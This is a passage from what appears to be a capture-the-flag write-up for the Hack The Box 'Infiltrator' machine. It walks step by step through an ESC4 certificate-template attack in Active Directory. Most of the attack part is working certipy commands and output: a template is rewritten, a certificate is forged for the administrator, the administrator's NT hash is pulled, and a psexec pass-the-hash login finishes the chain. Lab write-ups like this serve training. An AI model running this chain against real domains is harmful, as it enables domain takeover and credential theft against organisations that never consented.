$ certipy find -u 'infiltrator_svc$@Infiltrator.htb' -hashes '9ae7de37439f359608eccf2cff5d32b9' -dc-ip 10.10.11.31
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Trying to get CA configuration for 'infiltrator-DC01-CA' via CSRA
[!] Got error while trying to get CA configuration for 'infiltrator-DC01-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'infiltrator-DC01-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Got CA configuration for 'infiltrator-DC01-CA'
[*] Saved BloodHound data to '20240907170709_Certipy.zip'. Drag and drop the file into the BloodHound GUI from @ly4k
[*] Saved text output to '20240907170709_Certipy.txt'
[*] Saved JSON output to '20240907170709_Certipy.json'

```

JSON hits us back with that sweet, sweet **ESC4** vulnerability. And guess who’s got it? That’s right—**`INFILTRATOR.HTB\\infiltrator_svc`** out here holdin’ dangerous perms like it’s his mixtape. Now if you don’t know about ESC4—lemme hit you with the lore:

> ESC4 means our boi has **write access to a certificate template**. Which is basically like giving a random intern edit rights to the company’s security policy and just hopin’ for the best.

We ain't just playin' with fire, we out here installin’ a _gas line_ to the template. Once we can overwrite the template’s settings, we just sprinkle a little bit of ESC1 dust on it (you know, **allow client auth, no manager approval, enroll enabled, all that good good**) and suddenly it’s not just a template anymore—it’s a ticket printer.

And guess who’s standin’ in line for that golden cert? **We are.** This ain't exploitation. This is straight-up **admin cosplay** with full privileges. Let’s go cook that cert and print ourselves a domain takeover, easy-bake oven style.

```console
$ certipy template -u 'infiltrator_svc$@Infiltrator.htb' -hashes '9ae7de37439f359608eccf2cff5d32b9' -target-ip infiltrator.htb -template 'Infiltrator_Template'
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Updating certificate template 'Infiltrator_Template'
[*] Successfully updated 'Infiltrator_Template'

$ certipy req -u 'infiltrator_svc$@Infiltrator.htb' -hashes '9ae7de37439f359608eccf2cff5d32b9' -target dc01.infiltrator.htb -ca 'infiltrator-DC01-CA' -template 'Infiltrator_Template' -upn 'administrator@infiltrator.htb'
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'administrator@infiltrator.htb'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator.pfx'

$ certipy auth -pfx administrator.pfx -domain 'infiltrator.htb' -dc-ip 10.10.11.31
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@infiltrator.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@infiltrator.htb': aad3b435b51404eeaad3b435b51404ee:1356f502d2764368302ff0369b1121a1
```

And just like that... We’re logged in as **Administrator**.

```console
$ psexec.py -hashes ':1356f502d2764368302ff0369b1121a1' administrator@10.10.11.31
```

Box rooted. Just pure ACL wizardry and a cert with too much ambition. Time to stroll into `C:\Users\Administrator\Desktop`, pop open that `root.txt`, and whisper sweet nothings to the final flag.

**GG. Game. Over**

